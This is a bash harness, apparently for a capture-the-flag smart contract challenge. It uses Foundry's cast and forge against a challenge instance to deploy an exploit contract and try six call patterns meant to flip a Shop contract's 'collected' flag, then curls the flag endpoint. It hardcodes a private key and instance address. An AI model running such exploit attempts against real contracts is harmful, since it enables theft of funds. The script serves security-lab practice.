#!/bin/bash
#
# Multi-Call Shop Exploit Test
# Tests hypothesis that multiple collectPrize() calls in same transaction
# causes memory interference leading to collected=true
#
# Based on patterns from "The Contribution That Undid The Harbor"

set -e

# Instance details
RPC="http://154.57.164.76:31324/api/aaab1ae7-ab1b-41d4-9943-41401751361e"
PRIVKEY="1a94e1b9db50601fc22e6936be2a1500613d4db4821c3b8e5ada14c47b7f26c8"
SETUP="0x1075D059593E590f2B58a00950d96532008eF3d6"

# Derived
PLAYER=$(cast wallet address --private-key $PRIVKEY)

echo "[*] Player address: $PLAYER"
echo "[*] Setup contract: $SETUP"
echo ""

# Step 1: Deploy ShopExploit contract
echo "[1] Deploying ShopExploit contract..."
DEPLOY_OUTPUT=$(forge create ShopExploit.sol:ShopExploit \
    --private-key $PRIVKEY \
    --rpc-url $RPC \
    --legacy \
    --broadcast 2>&1)

EXPLOIT=$(echo "$DEPLOY_OUTPUT" | grep "Deployed to:" | awk '{print $3}')

if [ -z "$EXPLOIT" ]; then
    echo "❌ Failed to deploy ShopExploit"
    echo "$DEPLOY_OUTPUT"
    exit 1
fi

echo "✓ ShopExploit deployed at: $EXPLOIT"
echo ""

# Step 2: Set player (required before collectPrize)
echo "[2] Setting player..."
cast send $SETUP "setPlayer(address)" $PLAYER \
    --private-key $PRIVKEY \
    --rpc-url $RPC \
    --legacy > /dev/null 2>&1
echo "✓ Player set"
echo ""

# Helper function to check collected status
check_collected() {
    cast call $SETUP "collected()" --rpc-url $RPC
}

echo "[3] Initial collected status: $(check_collected)"
echo ""

# Attack 1: Multi-call with different counts
echo "[4] Testing Attack 1: Multiple calls in same transaction"
for count in 2 3 5 10 20 50; do
    echo "  Testing with $count calls..."

    cast send $EXPLOIT "multiCall(address,uint256)" $SETUP $count \
        --private-key $PRIVKEY \
        --rpc-url $RPC \
        --legacy \
        --gas-limit 10000000 > /dev/null 2>&1 || true

    collected=$(check_collected)
    echo "    Collected: $collected"

    if [ "$collected" != "0x0000000000000000000000000000000000000000000000000000000000000000" ]; then
        echo ""
        echo "✓✓✓ SUCCESS! collected = true with $count calls!"
        echo ""
        echo "[*] Getting flag..."
        curl -s "http://154.57.164.76:31324/api/flag"
        echo ""
        exit 0
    fi
done
echo ""

# Attack 2: Multi-call with different data sizes
echo "[5] Testing Attack 2: Multiple calls with varying data sizes"
for data_size in 0 32 64 84 128 256; do
    echo "  Testing with data size $data_size..."

    cast send $EXPLOIT "multiCallWithData(address,uint256,uint256)" $SETUP 5 $data_size \
        --private-key $PRIVKEY \
        --rpc-url $RPC \
        --legacy \
        --gas-limit 10000000 > /dev/null 2>&1 || true

    collected=$(check_collected)
    echo "    Collected: $collected"

    if [ "$collected" != "0x0000000000000000000000000000000000000000000000000000000000000000" ]; then
        echo ""
        echo "✓✓✓ SUCCESS! collected = true with data size $data_size!"
        echo ""
        echo "[*] Getting flag..."
        curl -s "http://154.57.164.76:31324/api/flag"
        echo ""
        exit 0
    fi
done
echo ""

# Attack 3: Alternating patterns
echo "[6] Testing Attack 3: Alternating call patterns"
cast send $EXPLOIT "alternatingCalls(address)" $SETUP \
    --private-key $PRIVKEY \
    --rpc-url $RPC \
    --legacy \
    --gas-limit 10000000 > /dev/null 2>&1 || true

collected=$(check_collected)
echo "  Collected: $collected"

if [ "$collected" != "0x0000000000000000000000000000000000000000000000000000000000000000" ]; then
    echo ""
    echo "✓✓✓ SUCCESS! collected = true with alternating pattern!"
    echo ""
    echo "[*] Getting flag..."
    curl -s "http://154.57.164.76:31324/api/flag"
    echo ""
    exit 0
fi
echo ""

# Attack 4: Memory manipulation
echo "[7] Testing Attack 4: Memory pointer manipulation"
cast send $EXPLOIT "memoryManipulation(address)" $SETUP \
    --private-key $PRIVKEY \
    --rpc-url $RPC \
    --legacy \
    --gas-limit 10000000 > /dev/null 2>&1 || true

collected=$(check_collected)
echo "  Collected: $collected"

if [ "$collected" != "0x0000000000000000000000000000000000000000000000000000000000000000" ]; then
    echo ""
    echo "✓✓✓ SUCCESS! collected = true with memory manipulation!"
    echo ""
    echo "[*] Getting flag..."
    curl -s "http://154.57.164.76:31324/api/flag"
    echo ""
    exit 0
fi
echo ""

# Attack 5: Rapid calls with try/catch
echo "[8] Testing Attack 5: Rapid succession calls"
cast send $EXPLOIT "rapidCalls(address)" $SETUP \
    --private-key $PRIVKEY \
    --rpc-url $RPC \
    --legacy \
    --gas-limit 10000000 > /dev/null 2>&1 || true

collected=$(check_collected)
echo "  Collected: $collected"

if [ "$collected" != "0x0000000000000000000000000000000000000000000000000000000000000000" ]; then
    echo ""
    echo "✓✓✓ SUCCESS! collected = true with rapid calls!"
    echo ""
    echo "[*] Getting flag..."
    curl -s "http://154.57.164.76:31324/api/flag"
    echo ""
    exit 0
fi
echo ""

# Attack 6: Recursive pattern
echo "[9] Testing Attack 6: Recursive call pattern"
for depth in 1 2 3 5; do
    echo "  Testing with recursion depth $depth..."

    cast send $EXPLOIT "recursiveCall(address,uint256)" $SETUP $depth \
        --private-key $PRIVKEY \
        --rpc-url $RPC \
        --legacy \
        --gas-limit 10000000 > /dev/null 2>&1 || true

    collected=$(check_collected)
    echo "    Collected: $collected"

    if [ "$collected" != "0x0000000000000000000000000000000000000000000000000000000000000000" ]; then
        echo ""
        echo "✓✓✓ SUCCESS! collected = true with recursion depth $depth!"
        echo ""
        echo "[*] Getting flag..."
        curl -s "http://154.57.164.76:31324/api/flag"
        echo ""
        exit 0
    fi
done
echo ""

echo "[*] Final collected status: $(check_collected)"
echo ""
echo "✗ All attacks failed. Collected remains false."
echo ""
echo "Attacks tested:"
echo "  1. Multi-call (2, 3, 5, 10, 20, 50 calls)"
echo "  2. Multi-call with data (0, 32, 64, 84, 128, 256 byte hookData)"
echo "  3. Alternating patterns"
echo "  4. Memory pointer manipulation"
echo "  5. Rapid succession with try/catch"
echo "  6. Recursive calls (depth 1-5)"
echo ""
echo "Next steps:"
echo "  - Review test results"
echo "  - Analyze why multi-call didn't work"
echo "  - Consider alternative hypotheses"
